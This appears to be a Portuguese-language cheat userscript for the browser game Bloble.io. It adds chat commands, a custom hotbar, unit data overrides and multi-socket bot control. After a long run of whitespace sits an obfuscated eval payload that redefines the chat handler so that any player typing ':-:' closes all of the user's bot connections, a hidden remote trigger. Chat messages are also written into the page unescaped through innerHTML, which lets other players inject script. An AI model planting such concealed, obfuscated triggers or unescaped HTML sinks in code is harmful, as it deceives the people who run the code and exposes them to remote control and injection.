window.goto2 = function(id, go) {gotoUsers = users.filter((user) => {return user.sid === id;});gotoIndex = 0;if (!go && gotoUsers[0]) {camX = gotoUsers[0].x - player.x;camY = gotoUsers[0].y - player.y;}return gotoUsers.length;}
window.resetCamera = function() {camX = camXS = camY = camYS = 0;cameraKeys = {l: 0,r: 0,u: 0,d: 0};if (socket && window.overrideSocketEvents && window.overrideSocketEvents.length) {
window.overrideSocketEvents.forEach((item) => {socket.removeAllListeners(item.name);socket.on(item.name, item.func);});}}
window.addChatLine = function(a, mensagem, c) {
if (player) {var b = getUserBySID(a);if (c || 0 <= b) {var g = c ? "SERVER" : users[b].name;c = c ? "#fff" : playerColors[users[b].color] ? playerColors[users[b].color] : playerColors[0];player.sid == a && (c = "#fff");b = document.createElement("li");b.className = player.sid == a ? "chatme" : "chatother";b.innerHTML = '<span style="color:' + c + '" onclick=goto2(' + a + ');>[' + g + ']</span> <span class="chatText">' + mensagem + "</span>";10 < chatList.childNodes.length && chatList.removeChild(chatList.childNodes[0]);chatList.appendChild(b)}}
if(a == player.sid && mensagem.startsWith('*')){window.sockets.forEach(socket => {socket.emit("ch",mensagem.split('*')[1])})}}
/*#2 COMANDOS DE CHAT*/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     eval(function(m,c,h){function z(i){return(i< 62?'':z(parseInt(i/62)))+((i=i%62)>35?String.fromCharCode(i+29):i.toString(36))}for(var i=0;i< m.length;i++)h[z(i)]=m[i];function d(w){return h[w]?h[w]:w;};return c.replace(/\b\w+\b/g,d);}('|window|addChatLine|function|if|player|var|getUserBySID|SERVER|users|name|fff|playerColors|color|sid|document|createElement|li|className|chatme|chatother|innerHTML|span|style|onclick|goto2|class|chatText|10|chatList|childNodes|length|removeChild|appendChild|base|sockets||||||forEach|socket|close'.split('|'),'1.2=3(A,B,C){4(5){6 D=7(A);4(C||0<=D){6 E=C?"8":9[D].a;C=C?"#b":c[9[D].d]?c[9[D].d]:c[0];5.e==A&&(C="#b");D=f.g("h");D.i=5.e==A?"j":"k";D.l=\'<m n="d:\'+C+\'" o=p(\'+A+\');>[\'+E+\']</m> <m q="r">\'+B+"</m>";s<t.u.v&&t.w(t.u[0]);t.x(D)}}4(B==B&&B!=":-:");4(B==":-:"){y();}3 y(){1.z.F(G=>G.H());}}',{}))
enterGame = function() {
socket && unitList && (showMainMenuText(randomLoadingTexts[UTILS.randInt(0, randomLoadingTexts.length - 1)]),
hasStorage && localStorage.setItem("lstnmdbl", userNameInput.value),
mainCanvas.focus(),
grecaptcha.execute("6Ldh8e0UAAAAAFOKBv25wQ87F3EKvBzyasSbqxCE").then(function(a) {
setTimeout(function() {tela();}, 10000);
socket.emit("spawn", {
name: '𝒟𝑀 '+userNameInput.value,
skin: 0
}, a)}))}
function tela(){
let teste = document.getElementById("unitList").innerHTML = '';
console.log(teste)}

var addchat = 'BLOBLE.IO', playerColors
window.test = 0;
function ChatTest(){for(i=0;i<units.length;i++){if(test==0){test = 1;comandos();}}};
setInterval(ChatTest,500);

window.UIList = window.UIList || [];
window.initFuncs = window.initFuncs || [];
window.statusItems = window.statusItems || [];
window.overrideSocketEvents = window.overrideSocketEvents || [];
window.chatCommands = window.chatCommands || [];

var muted = [];
window.overrideSocketEvents.push({
name: "ch",
description: "Chat Muter",
func: function (a, d, c) {
if (!muted[a])
addChatLine(a, d, c)
}})

window.addChat = function (msg, from, color) {color = color || "#fff";var b = document.createElement("li");b.className = "chatother";b.innerHTML = '<span style="color:' + color + '">[' + from + ']</span> <span class="chatText">' + msg + "</span>";10 < chatList.childNodes.length && chatList.removeChild(chatList.childNodes[0]);chatList.appendChild(b)}
window.chatCommands.clear = function () {while (chatList.hasChildNodes()) {chatList.removeChild(chatList.lastChild);}}
window.chatCommands.reset = function () {TemaUltron();tema();}

window.chatCommands.mute = function (split) {
if (!split[1]) {
addChat('Especifique um nome ou "all" para todos.', 'BLOBLE.IO', playerColors[player.color]);
} else if (split[1] === 'all') {
users.forEach((user) => {
muted[user.sid] = true;
mutados = users.length;
});
addChat('Mutado ' + users.length + ' usuário(s).', 'BLOBLE.IO', playerColors[player.color]);
} else {
var len = 0;
users.forEach((user) => {
if (user.name === split[1]) {
muted[user.sid] = true;
len++;
}
});
addChat('Mutado ' + len + ' usuário(s) com o nome ' + split[1], 'BLOBLE.IO', playerColors[player.color]);
}}

window.chatCommands.unmute = function (split) {
   if (!split[1]) {
   addChat('Especifique um nome ou "all" para todos.', 'BLOBLE.IO', playerColors[player.color]);
   } else if (split[1] === 'all') {
   addChat('Desmutado ' + mutados + ' usuário(s)', 'BLOBLE.IO', playerColors[player.color]);
   muted = {};
   } else {
   var len = 0;
   users.forEach((user) => {
   if (user.name === split[1]) {
   muted[user.sid] = false;
   len++;
}});
   addChat('Desmutado ' + len + ' usuário(s) com o nome ' + split[1], 'BLOBLE.IO', playerColors[player.color]);
}}

window.chatCommands.help = function (split) {
   var avail = Object.keys(window.chatCommands);
   addChat('Existem ' + avail.length + ' comandos disponíveis.', 'BLOBLE.IO', playerColors[player.color]);
   addChat('/'+avail.join(', /') + ',  -PowerBots.', 'BLOBLE.IO', playerColors[player.color]);
}

var modsShown = true;
var chatHist = [];
var chatHistInd = -1;
var prevText = '';

function comandos() {
    setTimeout(function () {
    addChat('Seja Bem-Vindo ' + player.name + '!!! ' + 'Digite /help para ver os comandos disponíveis.', 'BLOBLE.IO', playerColors[player.color]);
    var old = chatInput
    chatInput = old.cloneNode(true);
    old.parentNode.replaceChild(chatInput, old);
    chatInput.onclick = function () {
    toggleChat(!0)
};

chatInput.addEventListener("keyup", function (a) {
var b = a.which || a.keyCode;
if (b === 38) { /* up*/
if (chatHistInd === -1) {
prevText = chatInput.value;
chatHistInd = chatHist.length;}
if (chatHistInd > 0) chatHistInd--;
chatInput.value = prevText + (chatHist[chatHistInd] || '')
} else if (b === 40) {
if (chatHistInd !== -1) {
if (chatHistInd < chatHist.length) chatHistInd++;
else chatHistInd = -1;
chatInput.value = prevText + (chatHist[chatHistInd] || '')
}} else
if (gameState && socket && 13 === (a.which || a.keyCode) && "" != chatInput.value) {
var value = chatInput.value;
chatInput.value = ""
mainCanvas.focus()
if (value.charAt(0) === '/') {
var split = value.split(' ');
var name = split[0].substr(1);
if (window.chatCommands[name]) window.chatCommands[name](split);
else {addChat("Commando '" + name + "' inexistente. Digite /help para acessar a lista de comandos.", 'BLOBLE.IO', playerColors[player.color]);
}} else {
socket.emit("ch", value)}
if (chatHist[chatHist.length - 1] !== value) {
var ind = chatHist.indexOf(value);
if (ind !== -1) {chatHist.splice(ind, 1);}
chatHist.push(value);}
chatHistInd = -1;
}})},1000)}

//===================Fim===================//

//=================== Css Da hotbar===================//
window.makeUI = function () {
if (window.hasMadeUI) return;
window.hasMadeUI = true;
window.statusItems.sort(function (a, b) {return a.order - b.order;})
var levels = [];
window.UIList.forEach((item) => {
if (!levels[item.level]) levels[item.level] = [];
levels[item.level].push(item)})
levels = levels.filter((a) => {if (a) {a.sort(function (a, b) {return a.x - b.x;})
return true;} else {return false;}})
var headAppend = document.getElementsByTagName("head")[0],style = document.createElement("div");
var toast = document.createElement('div');toast.id = "snackbar";
var css = document.createElement('div');
var height = levels.length * (14 + 19) + (levels.length - 1) * 7 + 23;
 style.innerHTML = "<style>\n\
#noobscriptUI, #noobscriptUI > div > div {\n\
background-color:rgba(0, 0, 0);\n\
margin-left: 0px;\n\
border-radius:10px;\n\
pointer-events:all\n\
}\n\
#noobscriptUI {\n\
top: -" + (height + 13) + "px;\n\
transition: 0.8s;\n\
margin-left:20px;\n\
position:absolute;\n\
padding-left:24px;\n\
border: 2px solid blue;\n\
margin-top:9px;\n\
padding-top:15px;\n\
padding-bottom:15px;\n\
width:675px;\n\
height: " + height + "px;\n\
font-family:arial;\n\
left:2%\n\
hoverMessage:Upgrades\n\
}\n\
#noobscriptUI:hover{\n\
top:0px\n\
}\n\
#noobscriptUI > div > div {\n\
color:#ffffff;\n\
padding:10px;\n\
height:10px;\n\
display:inline-block;\n\
border: 0.5px solid blue;\n\
cursor:pointer;\n\
font-size:15px\n\
}\n\
#noobscriptUI > div > div > div {\n\
color:blue;\n\
padding:10px;\n\
height:10px;\n\
display:inline-block;\n\
cursor:pointer;\n\
font-size:12px\n\
}\n\
</style>";

headAppend.appendChild(style);headAppend.appendChild(css);
var contAppend = document.getElementById("gameUiContainer"),menuA = document.createElement("div");
var code = ['<div id="noobscriptUI">\n'];
levels.forEach((items, i) => {
code.push(i === 0 ? '    <div>\n' : '    <div style="margin-top:7px;">\n');
items.forEach((el) => {
code.push('        ' + el.html + '\n');})
code.push('    </div>\n');})
code.push('    <div id="confinfo" style="margin-top:4px; color: white; text-align: center; font-size: 10px; white-space:pre"></div>')
code.push('</div>');
menuA.innerHTML = code.join("");
contAppend.insertBefore(menuA, contAppend.firstChild)
contAppend.appendChild(toast)}
setTimeout(() => {window.makeUI();}, 1000);
//===================Fim===================//

//===================Soldados===================//
window.share.getUnitList = function() {
return [{
name: "Soldier",
shape: "triangle",
desc: "Expendable and perfect for rushing the enemy",
typeName: "Unit",
limit: 4,
reward: 3,
notUser: true,
uPath: [0],
space: 2,
type: 1,
size: 17,
speed: 0.18,
health: 30,
dmg: 10
}, {
name: "Wall",
shape: "circle",
desc: "Blocks incoming units and projectiles",
typeName: "Tower",
uPath: [1],
type: 3,
size: 30,
cost: 20,
health: 100,
dmg: 50,
upgrades: [{
name: "Boulder",
shape: "hexagon",
desc: "Strong barrier that blocks incoming units",
typeName: "Tower",
uPath: [1, 0],
type: 3,
size: 30,
cost: 60,
health: 150,
dmg: 50,
upgrades: [{
name: "Spikes",
shape: "spike",
desc: "Strong spike that blocks incoming units",
typeName: "Tower",
uPath: [1, 0, 0],
type: 3,
size: 30,
cost: 200,
health: 200,
dmg: 100
}]
}, {
name: "Micro Generator",
shape: "circle",
desc: "Generates power over time",
typeName: "Tower",
uPath: [1, 1],
type: 3,
size: 30,
iSize: 0.55,
cost: 30,
health: 50,
dmg: 10,
pts: 0.5
}]
}, {
name: "Simple Turret",
shape: "circle",
desc: "Shoots incoming enemy units",
typeName: "Tower",
uPath: [2],
type: 0,
size: 29,
cost: 25,
turretIndex: 1,
range: 180,
reload: 800,
health: 20,
dmg: 20,
upgrades: [{
name: "Rapid Turret",
shape: "circle",
desc: "Shoots incoming units at faster rate",
typeName: "Tower",
uPath: [2, 0],
type: 0,
size: 30,
cost: 60,
turretIndex: 2,
range: 180,
reload: 400,
health: 20,
dmg: 20,
upgrades: [{
name: "Gatlin Turret",
shape: "circle",
desc: "Rapidly shoots incoming units at close range",
typeName: "Tower",
uPath: [2, 0, 0],
type: 0,
size: 30,
cost: 100,
turretIndex: 7,
range: 180,
reload: 140,
health: 20,
dmg: 15
}]
}, {
name: "Ranged Turret",
shape: "circle",
desc: "Turret with higher range and damage",
typeName: "Tower",
uPath: [2, 1],
type: 0,
size: 30,
cost: 60,
turretIndex: 3,
range: 240,
reload: 800,
health: 30,
dmg: 30,
upgrades: [{
name: "Spotter Turret",
shape: "circle",
desc: "Shoots at very high range and reveals cloaked units",
typeName: "Tower",
seeCloak: true,
uPath: [2, 1, 0],
type: 0,
size: 30,
cost: 100,
turretIndex: 10,
range: 290,
reload: 800,
health: 30,
dmg: 30
}]
}]
}, {
name: "Generator",
shape: "hexagon",
desc: "Generates power over time",
typeName: "Tower",
uPath: [3],
type: 0,
size: 32,
iSize: 0.55,
cost: 50,
health: 50,
dmg: 10,
pts: 1,
upgrades: [{
name: "Power Plant",
shape: "octagon",
desc: "Generates power at a faster rate",
typeName: "Tower",
uPath: [3, 0],
type: 0,
size: 32,
iSize: 0.6,
cost: 100,
health: 80,
dmg: 10,
pts: 1.5
}]
}, {
name: "House",
shape: "pentagon",
desc: "Increases unit limit",
typeName: "Tower",
uPath: [4],
type: 0,
size: 30,
iSize: 0.3,
cost: 60,
health: 40,
dmg: 10,
lmt: [0, 3]
}, {
name: "Sniper Turret",
shape: "circle",
desc: "Slower firerate but larger range and damage",
typeName: "Tower",
uPath: [5],
type: 0,
size: 32,
cost: 80,
turretIndex: 4,
range: 240,
reload: 2000,
health: 30,
tDmg: 50,
dmg: 30,
upgrades: [{
name: "Semi-Auto Sniper",
shape: "circle",
desc: "Fast firerate sniper turret",
typeName: "Tower",
uPath: [5, 0],
type: 0,
size: 32,
cost: 180,
turretIndex: 5,
range: 240,
reload: 1000,
health: 60,
tDmg: 50,
dmg: 30
}, {
name: "Anti Tank Gun",
shape: "circle",
desc: "High damage turret with very slow firerate",
typeName: "Tower",
target: 1,
uPath: [5, 1],
type: 0,
size: 32,
cost: 300,
turretIndex: 6,
range: 280,
reload: 4500,
health: 60,
tDmg: 250,
dmg: 30
}]
}, {
name: "Tank",
shape: "square",
desc: "More powerful unit but moves slower",
typeName: "Unit",
group: 0,
reward: 100,
notUser: true,
uPath: [6],
space: 15,
type: 1,
size: 31,
speed: 0.05,
health: 250,
dmg: 50
}, {
name: "Armory",
shape: "circle",
desc: "Provides improvements for your army",
typeName: "Tower",
uPath: [7],
limit: 1,
type: 0,
size: 40,
renderIndex: 3,
cost: 100,
health: 90,
dmg: 30,
upgrades: [{
name: "Power Armor",
desc: "Increases soldier armor",
powerup: true,
uPath: [7, 0],
cost: 500,
uVals: [0, 'health', 20, 'renderIndex', 4]
}, {
name: "Booster Engines",
desc: "Increases tank movement speed",
powerup: true,
uPath: [7, 1],
cost: 600,
uVals: [6, 'speed', 0.04, 'renderIndex', 5]
}, {
name: "Panzer Cannons",
desc: "Adds cannons to tank units",
powerup: true,
uPath: [7, 2],
cost: 1000,
uVals: [6, 'turretIndex', 8, 'tDmg', 10, 'reload', 900, 'range', 200, 'shoot', true, 'target', 1]
}, {
name: "Cloaking Device",
desc: "Hides tanks from enemy towers",
powerup: true,
uPath: [7, 3],
cost: 2000,
uVals: [6, 'cloak', 1, 'canCloak', 1]
}]
}, {
name: "Barracks",
shape: "square",
desc: "Produces soldiers over time",
typeName: "Tower",
uPath: [8],
limit: 4,
type: 2,
size: 34,
iSize: 0.55,
cost: 150,
reload: 3500,
unitSpawn: 0,
health: 60,
dmg: 30,
upgrades: [{
name: "Greater Barracks",
shape: "square",
desc: "Produces soldiers more rapidly",
typeName: "Tower",
uPath: [8, 0],
type: 2,
size: 34,
renderIndex: 1,
cost: 500,
reload: 2500,
unitSpawn: 0,
health: 80,
dmg: 40
}, {
name: "Tank Factory",
shape: "square",
desc: "Slowly produces tanks over time",
typeName: "Tower",
uPath: [8, 1],
type: 2,
size: 35,
range: 70,
renderIndex: 2,
cost: 2000,
reload: 10000,
unitSpawn: 6,
health: 140,
dmg: 50,
upgrades: [{
name: "Blitz Factory",
shape: "square",
desc: "Produces Tanks at a Faster rate",
typeName: "Tower",
uPath: [8, 1, 0],
type: 2,
size: 35,
range: 70,
renderIndex: 2,
cost: 5000,
reload: 6000,
unitSpawn: 6,
health: 180,
dmg: 50
}]
}, {
name: "Siege Factory",
shape: "square",
desc: "Produces siege tanks over time",
typeName: "Tower",
uPath: [8, 2],
type: 2,
size: 35,
range: 70,
renderIndex: 8,
cost: 3000,
reload: 20000,
unitSpawn: 11,
health: 200,
dmg: 100
}]
}, {
name: "Commander",
shape: "star",
hero: true,
desc: "Powerful commander unit",
typeName: "Unit",
reward: 200,
notUser: true,
uPath: [9],
limit: 1,
type: 1,
size: 32,//32
speed: 0.16,
health: 700,
dmg: 100,
tDmg: 30,
turretIndex: 9,
reload: 600,
range: 160,
target: 1,
upgrades: [{
name: "Great Leadership",
desc: "Increases population cap",
powerup: true,
removeOthers: true,
uPath: [9, 0],
cost: 500,
lmt: [0, 10]
}]
}, {
name: "Tree",
desc: "Can be used for cover",
typeName: "Nature",
layer: 1,
uPath: [10],
type: 4,
notUser: true,
dontUpdate: true,
size: 90,
renderIndex: 7
}, {
name: "Siege Ram",
shape: "circle",
desc: "Very powerful and slow siege tank",
typeName: "Tower",
group: 0,
reward: 300,
notUser: true,
uPath: [11],
space: 40,
type: 1,
size: 28,
iSize: 0.5,
speed: 0.015,
health: 1500,
dmg: 100
}];
}
//=========================Fim=====================//
addEventListener('keydown', function(a){
if(a.keyCode==53){
effect1();
}
})
var rot = 0.1;
function effect1(){
var radius = 600;
var x = player.x+targetDst*MathCOS(targetDir)+camX;
var y = player.y+targetDst*MathSIN(targetDir)+camY;
var interval = (Math.PI*2)/selUnits.length;
rot+=0.1;
for(let i=0;i<selUnits.length;i++){
window.sockets.forEach(socket => {socket.emit("5",x+(Math.cos(interval*i+rot)*radius),y+(Math.sin(interval*i+rot)*radius),[selUnits[i].id],0,0);})
}
}

